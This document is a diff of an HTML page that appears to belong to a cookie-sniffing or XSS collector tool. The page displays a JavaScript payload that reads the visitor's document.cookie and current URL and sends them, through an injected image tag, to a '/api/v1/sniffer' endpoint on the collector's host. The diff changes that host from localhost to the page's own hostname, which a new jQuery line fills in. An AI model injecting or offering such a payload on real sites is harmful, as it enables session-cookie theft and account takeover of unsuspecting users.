@@ -94,9 +94,9 @@
                                                 &lt;<span class="code-red">script</span>&gt;<br>
                                                 &emsp;<span class="code-blue">var</span> _COOKIE <span class="code-red">=</span> document.cookie;<br>
                                                 &emsp;<span class="code-blue">var</span> _HREF <span class="code-red">=</span> window.location.href;<br>
-                                                &emsp;<span class="code-blue">var</span> _DOMAIN <span class="code-red">=</span> <span class="code-yellow">"http://[::1]:3000"</span><br>
+                                                &emsp;<span class="code-blue">var</span> _DOMAIN <span class="code-red">=</span> <span class="code-yellow">"http://<span id="props-input-domain"></span>:3000";</span><br>
                                                 &emsp;<span class="code-blue">var</span> _URI <span class="code-red">=</span> <span class="code-yellow">"/api/v1/sniffer?pos=" <span class="code-red">+</span></span> _HREF<br>
-                                                &emsp;<span class="code-blue">var</span> LINK <span class="code-red">=</span> _DOMAIN <span class="code-red">+</span> _URI <span class="code-red">+</span> <span class="code-yellow">"&cookies="</span> <span class="code-red">+</span> _COOKIE <br>
+                                                &emsp;<span class="code-blue">var</span> LINK <span class="code-red">=</span> _DOMAIN <span class="code-red">+</span> _URI <span class="code-red">+</span> <span class="code-yellow">"&cookies="</span> <span class="code-red">+</span> _COOKIE;<br>
                                                 &emsp;document.<span class="code-blue">write</span>(<span class="code-yellow">`&lt;img src="<span class="text-white">${LINK}</span>"&gt;`</span>);<br>
                                                 &lt;/<span class="code-red">script</span>&gt;<br>
                                             </p>
@@ -165,6 +165,7 @@
 
             (function () {
                 'use strict'
+                    $("#props-input-domain").html(document.location.hostname)
                     document.querySelector('#navbarSideCollapse').addEventListener('click', function () {
                     document.querySelector('.offcanvas-collapse').classList.toggle('open')
                 })
